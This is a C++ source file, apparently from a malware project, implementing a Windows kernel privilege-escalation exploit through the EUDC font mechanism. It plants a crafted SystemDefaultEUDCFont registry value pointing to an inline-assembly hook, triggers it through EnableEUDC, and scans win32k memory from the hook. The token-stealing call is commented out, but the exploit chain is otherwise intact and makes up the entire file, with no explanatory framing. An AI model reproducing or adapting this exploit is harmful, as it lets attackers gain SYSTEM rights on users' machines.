#include "core\core.h"
#include "core\reestr.h"

namespace Elevation
{

#ifndef _WIN64

BOOL WINAPI EnableEUDC( BOOL fEnableEUDC );

static VOID WINAPI SetSystemRights(PVOID lParam)
{
	//SetSystemToken();
	API(KERNEL32, OutputDebugStringA)("EUDC");
	return;
};

VOID  __declspec(naked) WINAPI HookAsm()
{
	__asm
	{
		push ebp
		call SetSystemRights
		mov ebp,esp
		add ebp,30h	//
		mov eax,[ebp + 4]
		mov ecx,[eax - 4]
		add ecx,eax		//	 win32k!BuildAndLoadLinkedFontRoutine
search:
		movsx eax,[ecx]
		cmp al,0x85 
		jne next

		movsx eax,[ecx+1]
		cmp al,0xc0 
		je ok
next:
		inc ecx
		jmp search
ok:
		push ecx
		xor eax,eax
		ret	
	};
};

#endif

bool EUDC()
{
#ifdef _WIN64
	return false;
#else
	int acp = GetACP();
	StringBuilderStack<32> eudcName( _CS_("EUDC\\") );
	eudcName += acp;
	Reestr eudcKey(HKEY_CURRENT_USER);
	if( !eudcKey.Create(eudcName) ) return false;
	Mem::Data data( sizeof(void*) * 10 );
	data.SetFull(0);
	data.SetLen( data.Size() );
	((void**)data.Ptr())[7] = HookAsm;
	StringBuilderStack<48> SystemDefaultEUDCFont( _CS_("SystemDefaultEUDCFont") );
	eudcKey.SetData( SystemDefaultEUDCFont, data );
	bool ret = API(GDI32, EnableEUDC)(TRUE) != 0;
	//eudcKey.DelValue(SystemDefaultEUDCFont);
	return ret;
#endif
}

}
